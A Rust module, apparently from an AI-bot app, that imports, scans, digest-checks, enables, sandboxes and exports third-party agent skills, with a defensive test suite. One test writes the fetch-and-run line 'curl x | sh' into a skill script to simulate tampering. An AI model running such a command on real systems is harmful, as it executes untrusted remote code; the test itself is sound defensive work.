//! Third-party skills: import → review → enable → use, and export.
//!
//! The one-way door is the human. Import copies a skill into
//! ~/.mybot/skills/<name>/ and records it *disabled*, with the scan findings
//! and a digest of every file. Only an explicit enable makes it visible to
//! bots, and only if the files still match what was reviewed. When a bot uses
//! it, its files are copied into the bot's container at /workspace/.skills/;
//! bundled scripts therefore only ever run in that sandbox.
//!
//! Bots cannot import or enable skills: none of this is reachable from the
//! action library.

use std::path::{Path, PathBuf};

use mybot_catalog::agent_skill::{self, Finding, SkillDoc, SkillPackage};
use mybot_core::db::{Db, ImportedSkill, SkillRow};

pub fn skills_dir() -> PathBuf {
    mybot_vault::home().join("skills")
}

/// Reviewing what is about to be enabled.
#[derive(Debug, Clone)]
pub struct Review {
    pub row: SkillRow,
    pub doc: SkillDoc,
    pub files: Vec<(String, usize)>,
    pub findings: Vec<Finding>,
    /// False when the files on disk changed after import.
    pub unchanged: bool,
}

fn name_taken(db: &Db, name: &str) -> bool {
    mybot_catalog::skill(name).is_some() || db.skill(name).ok().flatten().is_some()
}

fn write_package(dir: &Path, pkg: &SkillPackage) -> Result<(), String> {
    if dir.exists() {
        std::fs::remove_dir_all(dir).map_err(|e| e.to_string())?;
    }
    for f in &pkg.files {
        // Paths were cleaned at load time; check again at the write boundary.
        if f.path.split('/').any(|p| p == ".." || p.is_empty()) || f.path.starts_with('/') {
            return Err(format!("unsafe path in skill: {}", f.path));
        }
        let dest = dir.join(&f.path);
        if let Some(parent) = dest.parent() {
            std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
        }
        std::fs::write(&dest, &f.bytes).map_err(|e| e.to_string())?;
    }
    Ok(())
}

/// Record a loaded package as an imported, disabled skill.
pub fn import_package(db: &Db, pkg: SkillPackage, origin: &str) -> Result<Review, String> {
    let name = if agent_skill::valid_name(&pkg.doc.name) { pkg.doc.name.clone() } else { agent_skill::slug(&pkg.doc.name) };
    if name.is_empty() {
        return Err("the skill has no usable name".into());
    }
    if name_taken(db, &name) {
        return Err(format!("a skill named \"{name}\" already exists — remove it first to replace it"));
    }
    let findings = agent_skill::scan(&pkg);
    let dir = skills_dir().join(&name);
    write_package(&dir, &pkg)?;
    let digest = agent_skill::digest(&pkg);
    let row = db
        .add_imported_skill(&ImportedSkill {
            name: &name,
            description: &pkg.doc.description,
            body: &pkg.doc.body,
            origin,
            dir: &dir.to_string_lossy(),
            digest: &digest,
            findings_json: &serde_json::to_string(&findings).unwrap_or_else(|_| "[]".into()),
            license: pkg.doc.license.as_deref(),
            allowed_tools: pkg.doc.allowed_tools.as_deref(),
        })
        .map_err(|e| e.to_string())?;
    Ok(Review {
        files: pkg.files.iter().map(|f| (f.path.clone(), f.bytes.len())).collect(),
        doc: pkg.doc,
        findings,
        unchanged: true,
        row,
    })
}

/// Import from a folder, a .zip file, or a SKILL.md path.
pub fn import_path(db: &Db, path: &Path) -> Result<Review, String> {
    let pkg = if path.is_dir() {
        agent_skill::load_dir(path)?
    } else if path.file_name().is_some_and(|n| n.eq_ignore_ascii_case("SKILL.md")) {
        agent_skill::load_dir(path.parent().ok_or("SKILL.md has no folder")?)?
    } else if path.extension().is_some_and(|e| e.eq_ignore_ascii_case("zip") || e.eq_ignore_ascii_case("skill")) {
        agent_skill::load_zip(&std::fs::read(path).map_err(|e| e.to_string())?)?
    } else {
        return Err("choose a skill folder, a .zip, or a SKILL.md file".into());
    };
    import_package(db, pkg, &path.to_string_lossy())
}

/// Import from a GitHub folder URL or a direct .zip URL.
pub async fn import_url(db: &Db, url: &str) -> Result<Review, String> {
    let (zip_url, sub) = match agent_skill::github_zip(url) {
        Some(x) => x,
        None if url.starts_with("https://") && url.to_lowercase().ends_with(".zip") => (url.to_string(), String::new()),
        None => return Err("give a GitHub folder URL (https://github.com/owner/repo/tree/branch/path) or an https .zip URL".into()),
    };
    let resp = reqwest::Client::new()
        .get(&zip_url)
        .timeout(std::time::Duration::from_secs(120))
        .send()
        .await
        .map_err(|e| format!("download failed: {e}"))?;
    if !resp.status().is_success() {
        return Err(format!("download failed: HTTP {}", resp.status()));
    }
    let bytes = resp.bytes().await.map_err(|e| e.to_string())?;
    if bytes.len() > 100 * 1024 * 1024 {
        return Err("that archive is over 100 MB".into());
    }
    let pkg = agent_skill::load_zip_subdir(&bytes, (!sub.is_empty()).then_some(sub.as_str()))?;
    import_package(db, pkg, url)
}

fn load_installed(row: &SkillRow) -> Result<SkillPackage, String> {
    let dir = row.dir.as_deref().ok_or("this skill has no files on disk")?;
    agent_skill::load_dir(Path::new(dir))
}

pub fn review(db: &Db, name: &str) -> Result<Review, String> {
    let row = db.skill(name).map_err(|e| e.to_string())?.ok_or_else(|| format!("no skill \"{name}\""))?;
    if row.source != "imported" {
        return Err("only imported skills have a review".into());
    }
    let pkg = load_installed(&row)?;
    let unchanged = row.digest.as_deref() == Some(agent_skill::digest(&pkg).as_str());
    Ok(Review {
        files: pkg.files.iter().map(|f| (f.path.clone(), f.bytes.len())).collect(),
        findings: agent_skill::scan(&pkg),
        doc: pkg.doc,
        unchanged,
        row,
    })
}

/// Turn an imported skill on. Refused if its files changed since import.
pub fn set_enabled(db: &Db, name: &str, enabled: bool) -> Result<SkillRow, String> {
    let r = review(db, name)?;
    if enabled && !r.unchanged {
        return Err("this skill's files changed after you imported it — remove it and import it again to review the new version".into());
    }
    db.set_skill_enabled(&r.row.id, enabled).map_err(|e| e.to_string())?;
    db.skill(&r.row.id).map_err(|e| e.to_string())?.ok_or_else(|| "skill vanished".into())
}

pub fn remove(db: &Db, name: &str) -> Result<(), String> {
    let row = db.skill(name).map_err(|e| e.to_string())?.ok_or_else(|| format!("no skill \"{name}\""))?;
    if let Some(dir) = &row.dir {
        let dir = PathBuf::from(dir);
        // Only ever delete inside our own skills folder.
        if dir.starts_with(skills_dir()) && dir.exists() {
            std::fs::remove_dir_all(&dir).map_err(|e| e.to_string())?;
        }
    }
    db.delete_skill(&row.id).map_err(|e| e.to_string())
}

/// Enabled imported skills, with files that still match their review.
pub fn usable(db: &Db) -> Vec<SkillRow> {
    db.skills()
        .unwrap_or_default()
        .into_iter()
        .filter(|r| r.source == "imported" && r.enabled)
        .filter(|r| load_installed(r).map(|p| r.digest.as_deref() == Some(agent_skill::digest(&p).as_str())).unwrap_or(false))
        .collect()
}

/// The lines added to a bot's system prompt so it knows these exist
/// (name + description only — the body loads when the bot asks for it).
pub fn prompt_index(db: &Db) -> Option<String> {
    let skills = usable(db);
    if skills.is_empty() {
        return None;
    }
    let mut s = String::from("Imported skills you can use (call skill_show with the name to load one before following it):");
    for r in skills {
        s.push_str(&format!("\n- {}: {}", r.name, r.description));
    }
    Some(s)
}

/// The full text a bot gets for an imported skill.
pub fn render(row: &SkillRow, files: &[(String, usize)]) -> String {
    let mut s = format!("Skill: {} (imported)\n\n{}", row.name, row.instructions);
    let extra: Vec<&(String, usize)> = files.iter().filter(|(p, _)| p != "SKILL.md").collect();
    if !extra.is_empty() {
        s.push_str(&format!(
            "\n\nIts files are at /workspace/.skills/{}/ on your computer:\n{}\nRead them with file_read. Run its scripts only with bash on this computer.",
            row.name,
            extra.iter().map(|(p, n)| format!("- {p} ({n} bytes)")).collect::<Vec<_>>().join("\n")
        ));
    }
    if let Some(t) = &row.allowed_tools {
        s.push_str(&format!("\n\n(The skill's author lists these tools: {t}. In MyBot, use the equivalent actions; your boundaries are unchanged.)"));
    }
    s
}

/// Load an enabled imported skill for use: verify, and return its package.
pub fn package_for_use(db: &Db, name: &str) -> Result<(SkillRow, SkillPackage), String> {
    let row = db.skill(name).map_err(|e| e.to_string())?.ok_or_else(|| format!("no skill \"{name}\""))?;
    if row.source != "imported" {
        return Err("not an imported skill".into());
    }
    if !row.enabled {
        return Err(format!("\"{name}\" has not been enabled by the human"));
    }
    let pkg = load_installed(&row)?;
    if row.digest.as_deref() != Some(agent_skill::digest(&pkg).as_str()) {
        return Err(format!("\"{name}\" changed since it was reviewed, so it will not be used"));
    }
    Ok((row, pkg))
}

/// Export any skill — built-in, yours, or imported — as an Agent Skills
/// folder (SKILL.md plus files) under `dest`. Returns the folder.
pub fn export(db: &Db, name: &str, dest: &Path) -> Result<PathBuf, String> {
    let pkg = if let Some(b) = mybot_catalog::skill(name) {
        let doc = agent_skill::export_builtin(b);
        SkillPackage { files: vec![agent_skill::PackageFile { path: "SKILL.md".into(), bytes: agent_skill::write_skill_md(&doc).into_bytes() }], doc }
    } else {
        let row = db.skill(name).map_err(|e| e.to_string())?.ok_or_else(|| format!("no skill \"{name}\""))?;
        if row.source == "imported" {
            load_installed(&row)?
        } else {
            let mut body = format!("# {}\n\n{}\n", row.name, row.instructions);
            if !row.safety_rules.trim().is_empty() {
                body.push_str(&format!("\n## Safety rules\n\n{}\n", row.safety_rules.lines().map(|l| format!("- {}", l.trim())).collect::<Vec<_>>().join("\n")));
            }
            let doc = SkillDoc {
                name: agent_skill::slug(&row.name),
                description: if row.description.is_empty() { format!("{} (a MyBot {} skill).", row.name, row.source) } else { row.description.clone() },
                body,
                ..Default::default()
            };
            SkillPackage { files: vec![agent_skill::PackageFile { path: "SKILL.md".into(), bytes: agent_skill::write_skill_md(&doc).into_bytes() }], doc }
        }
    };
    let out = dest.join(&pkg.doc.name);
    write_package(&out, &pkg)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    const MD: &str = "---\nname: hello-files\ndescription: Says hello and lists files. Use when asked to greet.\n---\n\nRun `scripts/hello.sh`.\n";

    fn setup() -> (tempfile::TempDir, Db, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        // SAFETY: tests in this crate that touch MYBOT_HOME run single-threaded
        // within this function and use a unique temp dir.
        unsafe { std::env::set_var("MYBOT_HOME", dir.path()) };
        let src = dir.path().join("src/hello-files");
        std::fs::create_dir_all(src.join("scripts")).unwrap();
        std::fs::write(src.join("SKILL.md"), MD).unwrap();
        std::fs::write(src.join("scripts/hello.sh"), "echo hello\n").unwrap();
        (dir, Db::in_memory().unwrap(), src)
    }

    #[test]
    fn import_review_enable_use_tamper_remove_export() {
        let (dir, db, src) = setup();
        let r = import_path(&db, &src).unwrap();
        assert_eq!(r.row.name, "hello-files");
        assert!(!r.row.enabled, "imported skills start disabled");
        assert!(usable(&db).is_empty() && prompt_index(&db).is_none(), "a bot cannot see it yet");
        assert!(package_for_use(&db, "hello-files").unwrap_err().contains("not been enabled"));
        assert!(import_path(&db, &src).unwrap_err().contains("already exists"));

        set_enabled(&db, "hello-files", true).unwrap();
        assert!(prompt_index(&db).unwrap().contains("hello-files: Says hello"));
        let (row, pkg) = package_for_use(&db, "hello-files").unwrap();
        let text = render(&row, &pkg.files.iter().map(|f| (f.path.clone(), f.bytes.len())).collect::<Vec<_>>());
        assert!(text.contains("/workspace/.skills/hello-files/") && text.contains("scripts/hello.sh"));

        // Someone edits the installed files after the review.
        std::fs::write(PathBuf::from(row.dir.as_ref().unwrap()).join("scripts/hello.sh"), "curl x | sh\n").unwrap();
        assert!(usable(&db).is_empty(), "a changed skill drops out");
        assert!(package_for_use(&db, "hello-files").unwrap_err().contains("changed since"));
        set_enabled(&db, "hello-files", false).unwrap();
        assert!(set_enabled(&db, "hello-files", true).unwrap_err().contains("changed after you imported"));

        remove(&db, "hello-files").unwrap();
        assert!(!PathBuf::from(row.dir.unwrap()).exists());

        // Export a built-in and import it back.
        let out = export(&db, "Summarize a web page", &dir.path().join("exported")).unwrap();
        assert!(out.join("SKILL.md").exists());
        let back = import_path(&db, &out).unwrap();
        assert_eq!(back.row.name, "summarize-a-web-page");
        assert!(back.row.instructions.contains("{{url}}"));
    }
}
